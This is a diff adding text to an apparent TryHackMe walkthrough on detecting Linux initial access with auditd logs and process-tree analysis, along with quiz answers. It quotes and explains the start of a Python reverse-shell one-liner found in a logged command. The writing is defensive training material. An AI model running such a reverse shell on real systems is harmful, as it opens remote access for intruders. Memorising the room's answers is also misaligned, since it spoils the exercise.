@@ -256,10 +256,41 @@ ausearch -i --ppid 577
 
 <img width="1423" height="183" alt="Screenshot 2026-04-05 at 6 20 03 PM" src="https://github.com/user-attachments/assets/2dfd1b2e-9fbc-4b8c-9812-af8facbd7646" />
 
+In the last entry, we see the following command in the proctitle: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.
 
+This is the beginning of a Python reverse shell payload:
+* It imports socket which is used to create a connection
+* SOCK_STREAM indicates the creation of a TCP connection
+* s.connect(("10.x.x.x", PORT)) is the connection to an IP.
 
+In fact, we can see the full command in the image in Task 4, Question 1.
 
+Answer: Python
 
+Task 7 - Advanced Initial Access
 
+THM teaches that even though it is not as common for phishing and USB attacks to be succesful compared to windows, we still need to be aware of it.
+
+Supply chain compromise is also a common initial access technique, where an attacker targets software or services that are distributed to multiple downstream clients. By compromising a trusted vendor or update mechanism, the attacker can propagate malicious code to many organizations simultaneously.
+
+A well-known example is the Stuxnet attack, in which attackers weaponized legitimate software updates. Organizations that trusted and installed the update were unknowingly compromised.
+
+In order to detect these attack, we need to analyze the process tree.
+
+Questions 
+Question 1 - Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?
+This is a Supply Chain Compromise. Trusted apps were compromised to run malicious code.
+
+Answer: Supply Chain Compromise
+
+Question 2 - Which detection method can you use to detect a variety of Initial Access techniques?
+Answer: Process Tree Analysis 
+
+Conclusion
+
+In this room we learened:
+* Analysis on authentication logs 
+* Process Tree Analysis
+Hope this walkthrough was helpful!
 
     
